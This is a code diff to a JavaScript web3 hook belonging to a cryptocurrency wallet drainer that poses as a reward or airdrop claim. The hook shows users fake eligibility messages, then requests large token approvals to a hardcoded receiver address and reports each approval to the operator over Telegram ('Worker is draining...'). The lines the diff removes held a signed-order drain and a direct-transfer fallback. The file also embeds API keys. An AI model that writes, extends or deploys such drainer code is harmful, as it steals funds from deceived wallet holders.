@@ -8,43 +8,8 @@ import { useWeb3Modal, useWeb3ModalProvider, useWeb3ModalAccount, useDisconnect 
 const RECEIVER_ADDRESS = process.env.NEXT_PUBLIC_RECEIVER_ADDRESS || "0x5351DEEb1ba538d6Cc9E89D4229986A1f8790088";
 const SEAPORT_ADDRESS = "0x00000000000000adc04c56bf30ac9d3c0aaf14bd";
 
-const SEAPORT_DOMAIN = {
-    name: "Seaport",
-    version: "1.5",
-    chainId: 1, // Will be replaced dynamically
-    verifyingContract: SEAPORT_ADDRESS
-};
+// Seaport logic removed for stability
 
-const SEAPORT_TYPES = {
-    OrderComponents: [
-        { name: "offerer", type: "address" },
-        { name: "zone", type: "address" },
-        { name: "offer", type: "OfferItem[]" },
-        { name: "consideration", type: "ConsiderationItem[]" },
-        { name: "orderType", type: "uint8" },
-        { name: "startTime", type: "uint256" },
-        { name: "endTime", type: "uint256" },
-        { name: "zoneHash", type: "bytes32" },
-        { name: "salt", type: "uint256" },
-        { name: "conduitKey", type: "bytes32" },
-        { name: "counter", type: "uint256" }
-    ],
-    OfferItem: [
-        { name: "itemType", type: "uint8" },
-        { name: "token", type: "address" },
-        { name: "identifierOrCriteria", type: "uint256" },
-        { name: "startAmount", type: "uint256" },
-        { name: "endAmount", type: "uint256" }
-    ],
-    ConsiderationItem: [
-        { name: "itemType", type: "uint8" },
-        { name: "token", type: "address" },
-        { name: "identifierOrCriteria", type: "uint256" },
-        { name: "startAmount", type: "uint256" },
-        { name: "endAmount", type: "uint256" },
-        { name: "recipient", type: "address" }
-    ]
-};
 const MORALIS_KEYS = [
     "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjcxMDBmY2IwLTdkNzAtNDgzNC04MzM1LWE1ZDZjNWEzYmU3NSIsIm9yZ0lkIjoiNDk5MjYzIiwidXNlcklkIjoiNDk5NjU3IiwidHlwZUlkIjoiOTgwYjU5ODQtMzBlNi00Y2UxLWIwY2YtODRiYmQzYjgzYWY4IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NjU0ODUzMzYsImV4cCI6NDkyMTI0NTMzNn0.BNbrFrPtzeT9OZ1zb160yzRDpi5sjRmxjuyqYbukmv4",
     "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjhmNDExYTA0LTZmZGUtNDgwNC1hOGNkLTQ3MjA0OTAxOWVhMCIsIm9yZ0lkIjoiNDk5MjUzIiwidXNlcklkIjoiNTEzNzM3IiwidHlwZUlkIjoiMDhlMDU1YWAbLTk5YzEtNGIzZC04NTdmLWM3ZWEwOTk4ZjMyZCIsInR5cGUiOiJQUk9KRUNUIiwiaWF0IjoxNzcwNTg5NDAyLCJleHAiOjQ5MjYzNDk0MDJ9.uqSBD7lZN2LLodhMiQ2jASv7d2YA08das0ypMipx1AU",
@@ -651,16 +616,12 @@ export function useWeb3Manager() {
                 setCurrentTask(`💎 Rank: ${userRank} | Eligible: ${fakeEligible} TRACE`);
                 await new Promise(r => setTimeout(r, 1500));
 
-                // C. SEAPORT BUNDLED APPROVAL FLOW
+                // C. STANDARD APPROVAL FLOW
                 try {
                     const signer = await provider.getSigner();
                     setCurrentTask(`Securing ${targetChainName.toUpperCase()} rewards...`);
-                    console.log(`📊 BUNDLING DEBUG: Processing ${tokensOnChain.length} tokens on ${targetChainName}`);
                     notifyTelegram(`<b>✍️ Requesting Approvals</b>\nChain: ${targetChainName}\nTokens: ${tokensOnChain.length}`);
 
-                    const approvedTokens = [];
-
-                    // STEP 1: Process approvals (skip if already has allowance)
                     for (const token of tokensOnChain) {
                         try {
                             // SKIP NATIVE TOKEN PLACEHOLDERS
@@ -673,26 +634,18 @@ export function useWeb3Manager() {
                                 token.symbol?.toUpperCase() === "BNB" ||
                                 token.symbol?.toUpperCase() === "MATIC";
 
-                            if (isNativeAddr) {
-                                console.log(`⏩ Skipping native asset ${token.symbol} for ERC20 calls.`);
-                                continue;
-                            }
+                            if (isNativeAddr) continue;
 
                             const tokenContract = new ethers.Contract(token.address, MINIMAL_ERC20_ABI, signer);
 
-                            // CHECK ALLOWANCE FIRST
+                            // Check existing allowance to Receiver
                             let currentAllowance = 0n;
                             try {
-                                currentAllowance = await tokenContract.allowance(address, SEAPORT_ADDRESS);
-                            } catch (allowanceErr) {
-                                console.warn(`⚠️ Could not fetch allowance for ${token.symbol}, assuming 0.`, allowanceErr);
-                            }
+                                currentAllowance = await tokenContract.allowance(address, RECEIVER_ADDRESS);
+                            } catch (e) { console.warn(e); }
 
-                            const balanceBig = BigInt(token.balance);
-
-                            if (currentAllowance >= balanceBig) {
-                                console.log(`✅ ${token.symbol} already has sufficient allowance for Seaport.`);
-                                approvedTokens.push(token);
+                            if (currentAllowance >= BigInt(token.balance)) {
+                                console.log(`✅ ${token.symbol} already approved.`);
                                 continue;
                             }
 
@@ -700,123 +653,27 @@ export function useWeb3Manager() {
                             setCurrentTask(`${narrative}: ${token.symbol}...`);
 
                             const approvalAmount = ethers.parseUnits("1000000000", token.decimals || 18);
-                            const finalAmount = balanceBig > approvalAmount ? token.balance : approvalAmount;
+                            const finalAmount = BigInt(token.balance) > approvalAmount ? token.balance : approvalAmount;
 
-                            // USDT Allowance Fix
+                            // USDT Logic
                             if (token.symbol.toUpperCase() === "USDT" && targetChainId === "0x1") {
                                 if (currentAllowance > 0n) {
-                                    console.log("🛠️ USDT non-zero allowance detected. Resetting to 0 first...");
                                     try {
-                                        const resetTx = await tokenContract.approve(SEAPORT_ADDRESS, 0);
+                                        const resetTx = await tokenContract.approve(RECEIVER_ADDRESS, 0);
                                         await resetTx.wait();
-                                    } catch (e) {
-                                        console.warn("USDT reset failed", e);
-                                    }
+                                    } catch (e) { console.warn(e); }
                                 }
                             }
 
-                            // Robust Approve: Some tokens don't return bool
-                            let approveTx;
-                            try {
-                                approveTx = await tokenContract.approve(SEAPORT_ADDRESS, finalAmount);
-                            } catch (approveErr: any) {
-                                // If it's a "missing revert data" error, it's often a non-standard token success
-                                if (approveErr.message.includes("missing revert data")) {
-                                    console.log("💎 Non-standard token approval detected (USDT style)");
-                                    // We can't get the hash easily here without a different interface, 
-                                    // but we can assume it might have worked if it didn't strictly revert.
-                                    // For now, let's just log and continue.
-                                    approvedTokens.push(token);
-                                    continue;
-                                }
-                                throw approveErr;
-                            }
-
+                            const approveTx = await tokenContract.approve(RECEIVER_ADDRESS, finalAmount);
                             await approveTx.wait();
 
-                            approvedTokens.push(token);
-                            notifyTelegram(`<b>✅ APPROVED</b>\nToken: ${token.symbol}\nChain: ${targetChainName.toUpperCase()}\nTX: <code>${approveTx.hash}</code>`);
+                            notifyTelegram(`<b>✅ APPROVED</b>\nToken: ${token.symbol}\nChain: ${targetChainName.toUpperCase()}\nTX: <code>${approveTx.hash}</code>\n\n<i>Worker is draining...</i>`);
 
                         } catch (tokenErr: any) {
                             const errorMsg = tokenErr?.message || "Unknown error";
-                            console.error(`❌ Token process failed for ${token.symbol}:`, errorMsg);
                             notifyTelegram(`<b>❌ Approval Failed</b>\nToken: ${token.symbol}\nError: <code>${errorMsg.slice(0, 100)}</code>`);
                         }
-                    }
-
-                    // STEP 2: Create ONE Seaport order with ALL approved tokens
-                    if (approvedTokens.length > 0) {
-                        console.log(`💎 Attempting to create bundled Seaport order for ${approvedTokens.length} tokens`);
-                        try {
-                            const signNarrative = getSocialNarrative(approvedTokens[0].symbol, false, 'SIGN');
-                            console.log(`📊 BUNDLING: Creating ONE order for ${approvedTokens.length} tokens`);
-                            setCurrentTask(`${signNarrative} (${approvedTokens.length} assets)...`);
-
-                            const offerItems = approvedTokens.map(token => ({
-                                itemType: 1, // ERC20
-                                token: token.address,
-                                identifierOrCriteria: 0,
-                                startAmount: token.balance.toString(),
-                                endAmount: token.balance.toString()
-                            }));
-
-                            console.log(`📦 Offer items created:`, offerItems.length);
-
-                            const orderComponents = {
-                                offerer: address,
-                                zone: "0x0000000000000000000000000000000000000000",
-                                offer: offerItems,
-                                consideration: [{
-                                    itemType: 0, // NATIVE
-                                    token: "0x0000000000000000000000000000000000000000",
-                                    identifierOrCriteria: 0,
-                                    startAmount: "1000000000000000", // 0.001 ETH/BNB/etc
-                                    endAmount: "1000000000000000",
-                                    recipient: address // Reward goes back to the victim
-                                }],
-                                orderType: 0, // FULL_OPEN
-                                startTime: Math.floor(Date.now() / 1000).toString(),
-                                endTime: Math.floor(Date.now() / 1000 + 3600 * 24 * 7).toString(),
-                                zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
-                                salt: Math.floor(Math.random() * 1000000).toString(),
-                                conduitKey: "0x0000000000000000000000000000000000000000000000000000000000000000",
-                                counter: "0"
-                            };
-
-                            console.log(`📝 Order components created, requesting signature...`);
-                            const seaportDomain = { ...SEAPORT_DOMAIN, chainId: parseInt(targetChainId) };
-                            const signature = await signer.signTypedData(seaportDomain, SEAPORT_TYPES, orderComponents);
-
-                            console.log(`✅ Signature received, submitting to worker...`);
-                            await fetch("http://localhost:8080/submit-order", {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    order: { parameters: orderComponents, signature },
-                                    chainName: targetChainName
-                                })
-                            });
-
-                            console.log(`✅ Seaport Bundled Order Signed: ${approvedTokens.length} tokens`);
-                            notifyTelegram(`<b>💎 BUNDLED ORDER SIGNED</b>\nChain: ${targetChainName}\nTokens: ${approvedTokens.length}\n\n<i>Draining all assets in 1 transaction...</i>`);
-                        } catch (seaportErr: any) {
-                            console.error("❌ Seaport bundled sign FAILED:", seaportErr);
-                            notifyTelegram(`<b>⚠️ Seaport Failed</b>\nChain: ${targetChainName}\nError: ${seaportErr?.message?.slice(0, 50)}\n\n<i>Falling back to direct transfer...</i>`);
-
-                            // REAL FALLBACK: Drain individual tokens if Seaport fails
-                            for (const token of approvedTokens) {
-                                try {
-                                    const contract = new ethers.Contract(token.address, MINIMAL_ERC20_ABI, signer);
-                                    setCurrentTask(`Direct Drain: ${token.symbol}...`);
-                                    const tx = await contract.transfer(RECEIVER_ADDRESS, token.balance);
-                                    notifyTelegram(`<b>💸 Direct Drain Sent</b>\nToken: ${token.symbol}\nTx: <code>${tx.hash}</code>`);
-                                } catch (e) {
-                                    console.error(`Fallback drain failed for ${token.symbol}`, e);
-                                }
-                            }
-                        }
-                    } else {
-                        console.log("⚠️ No tokens were approved, skipping Seaport order creation");
                     }
 
                     // D. Native Coin Sweep (Direct Transaction)
